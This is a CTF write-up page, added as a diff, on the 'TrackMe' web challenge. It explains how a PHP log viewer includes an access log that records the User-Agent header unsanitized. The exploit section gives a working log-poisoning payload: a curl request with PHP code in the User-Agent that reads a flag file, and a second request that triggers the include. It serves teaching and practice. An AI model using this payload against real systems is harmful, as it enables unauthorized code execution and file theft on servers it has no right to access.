@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>TrackMe · September 2026 SkillBit Flash CTF writeup · NXT_CTFS</title>
+<meta name="description" content="A PHP log viewer `include`s the access log instead of reading it, and the User-Agent header is logged unsanitized. Poisoning the log with a PHP snippet in the User-Agent, then viewing it through the include, executes it and dumps the runtime-generated flag file." />
+<link rel="icon" href="../images/brand/logo.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=2" />
+<link rel="stylesheet" href="../css/styles.css?v=18" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<div class="backdrop" aria-hidden="true"></div>
+<div class="gutters" aria-hidden="true"></div>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <span class="nav-ws">[0]</span>
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#focus">categories</a>
+      <a href="../index.html#results">results</a>
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">challenge</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <span class="nav-clock" id="navClock" aria-hidden="true">00:00:00</span>
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../index.html#about">about</a>
+    <a href="../index.html#focus">categories</a>
+    <a href="../index.html#results">results</a>
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">challenge</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="wu-main container" id="top">
+  <div class="wu-crumbs"><a href="../index.html#top">nxt_ctfs</a> <span>/</span> <a href="../writeups.html">writeups</a> <span>/</span> <span>trackme</span></div>
+
+  <header class="wu-head">
+    <div class="wu-head-tags">
+      <span class="wu-cat wu-cat-web">web</span>
+    </div>
+    <h1>TrackMe <span>log poisoning via User-Agent</span></h1>
+    <div class="wu-flagrow">
+      <span class="wu-flagrow-k">flag</span>
+      <code id="wuFlag">SkillBit{...}</code>
+      <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+    </div>
+  </header>
+
+  <div class="wu-layout">
+    <article class="wu-article">
+<h2 id="overview"><a class="wu-anchor" href="#overview" aria-hidden="true">#</a>Overview</h2>
+<p>A PHP analytics dashboard logs every visitor: IP, User-Agent, Referer, URI,
+all appended to <code>access.log</code>. A log viewer at <code>/logs.php</code> lets the site
+owner read those logs back. The flavor text is doing a lot of work here: no
+one has reviewed this code since it was installed.</p>
+<h2 id="the-vulnerability"><a class="wu-anchor" href="#the-vulnerability" aria-hidden="true">#</a>The vulnerability</h2>
+<p><code>logs.php</code> renders a log file with <code>include</code> instead of a plain read:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">php</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-php">ob_start();
+include $path;
+$rendered = ob_get_clean();</code></pre>
+      
+    </figure><p><code>ob_get_clean()</code> and a later <code>htmlspecialchars()</code> make the <em>output</em> look
+safe, but that&#39;s irrelevant — <code>include</code> already executed anything
+PHP-shaped in the file before a single byte of output existed to escape.</p>
+<p>Meanwhile <code>index.php</code> writes the raw <code>User-Agent</code> header straight into that
+log, no sanitization at all:</p>
+<figure class="wu-code wu-code-output" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">php</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-php">$ua = $_SERVER['HTTP_USER_AGENT'] ?? '-';
+// ...
+$log .= &quot;User-Agent: $ua\n&quot;;
+file_put_contents(__DIR__ . &quot;/logs/access.log&quot;, $log, FILE_APPEND);</code></pre>
+      
+    </figure>
+<div class="wu-admon wu-admon-pitfall">
+      <p class="wu-admon-h">Pitfall</p>
+      <p>Escaping the <em>rendered</em> output of an <code>include</code> doesn&#39;t undo the <code>include</code>.
+By the time <code>htmlspecialchars</code> runs, any <code>&lt;?php ?&gt;</code> block in the file has
+already executed server-side — the escaping only protects a second read of
+already-dead output, not the include itself.</p>
+
+    </div>
+<p>Put together, this is classic <button type="button" class="wu-gloss" data-def="Injecting attacker-controlled code into a log file, then triggering the application to execute or interpret that log as code.">log poisoning</button>: get attacker-controlled PHP
+into a log file, then trigger the log viewer to <code>include</code> it.</p>
+<h2 id="exploit"><a class="wu-anchor" href="#exploit" aria-hidden="true">#</a>Exploit</h2>
+<p>The flag lives at <code>/flag-&lt;random hex&gt;.txt</code>, generated fresh at container
+startup, so the payload needs to glob for it rather than hardcode a name.</p>
+<p><strong>1. Poison the log</strong> — send a request whose User-Agent is a PHP snippet:</p>
+<figure class="wu-code" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">curl -A <span class="hljs-string">&#x27;&lt;?php $f=glob(&quot;/flag-*&quot;)[0]; echo file_get_contents($f); ?&gt;&#x27;</span> \</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">     http://target:8080/</span></span></code></pre>
+      
+    </figure><p><strong>2. Trigger it</strong> — view the log through the vulnerable include:</p>
+<figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">curl http://target:8080/logs.php?file=access.log</span></span></code></pre>
+      
+    </figure><p><code>logs.php</code> includes <code>access.log</code>, PHP executes the poisoned User-Agent line
+in place, and the flag file&#39;s contents come back in the rendered page.</p>
+<h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<p>The flag is injected per-deploy (<code>SkillBit{Fake_Flag_For_Testing}</code> is only
+the placeholder baked into the source); the live instance returns the real
+<code>SkillBit{...}</code> value through the poisoned log.</p>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#overview">Overview</a></li><li><a href="#the-vulnerability">The vulnerability</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#flag">Flag</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="gitsleuth.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Git Sleuth</span></a>
+    <a class="wu-pager-link wu-pager-next" href="carry-on.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Carry On</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Navigate</h4>
+      <a href="../index.html#about">About</a>
+      <a href="../index.html#focus">Categories</a>
+      <a href="../index.html#results">Results</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../index.html#join">Join</a>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=18"></script>
+</body>
+</html>
